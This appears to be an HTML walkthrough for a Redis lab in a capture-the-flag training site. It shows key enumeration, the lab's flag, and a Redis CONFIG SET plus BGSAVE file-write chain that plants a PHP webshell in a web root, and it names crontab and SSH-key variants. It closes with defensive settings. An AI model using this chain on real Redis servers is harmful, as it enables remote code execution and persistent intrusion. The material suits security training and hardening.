<h4>Step 1: Enumerate Keys</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Find Flag Key</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">redis> </span>KEYS *<br>
        <span class="prompt">Result: </span>admin:settings, admin:users_count, webshell, backup:last_run, payload, flag_data<br><br>
        <span class="prompt">redis> </span>GET flag_data<br>
        <span class="prompt">Result: </span><strong>FLAG{rd_c0nf1g_s3t_wr1t3}</strong>
    </div>
</div>

<h4>Step 2: CONFIG SET Attack Chain (Conceptual)</h4>
<p>
    The real exploit is writing arbitrary files using <code>CONFIG SET dir</code>,
    <code>CONFIG SET dbfilename</code>, and <code>BGSAVE</code>. This writes the
    Redis RDB dump (containing all keys/values) to any writable directory.
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. File Write Attack</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Step 1: </span>CONFIG SET dir /var/www/html/<br>
        <span class="prompt">Result: </span>OK<br><br>
        <span class="prompt">Step 2: </span>CONFIG SET dbfilename shell.php<br>
        <span class="prompt">Result: </span>OK<br><br>
        <span class="prompt">Step 3: </span>SET payload "&lt;?php system($_GET[c]); ?&gt;"<br>
        <span class="prompt">Result: </span>OK<br><br>
        <span class="prompt">Step 4: </span>BGSAVE<br>
        <span class="prompt">Result: </span>OK (Background saving started -- file written to /var/www/html/shell.php)
    </div>
</div>

<h4>Step 3: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{rd_c0nf1g_s3t_wr1t3}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt"># Step 1: Enumerate keys</span><br>
        <span class="prompt">$ </span>curl -s "http://target/SQLi-Arena/redis/lab3" \<br> --data-urlencode "cmd=KEYS *"<br><br>
        <span class="prompt"># Step 2: Retrieve the flag</span><br>
        <span class="prompt">$ </span>curl -s "http://target/SQLi-Arena/redis/lab3" \<br> --data-urlencode "cmd=GET flag_data"
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> <code>CONFIG SET dir</code> + <code>CONFIG SET dbfilename</code>
    + <code>BGSAVE</code> is the classic Redis file-write primitive. Common targets:
    (1) <strong>webshell</strong>: write PHP to web root,
    (2) <strong>crontab</strong>: write to <code>/var/spool/cron/</code> for RCE,
    (3) <strong>SSH keys</strong>: write to <code>~/.ssh/authorized_keys</code>.
    Defense: use <code>rename-command CONFIG ""</code> to disable CONFIG, restrict filesystem
    permissions, and run Redis as an unprivileged user.
</div>
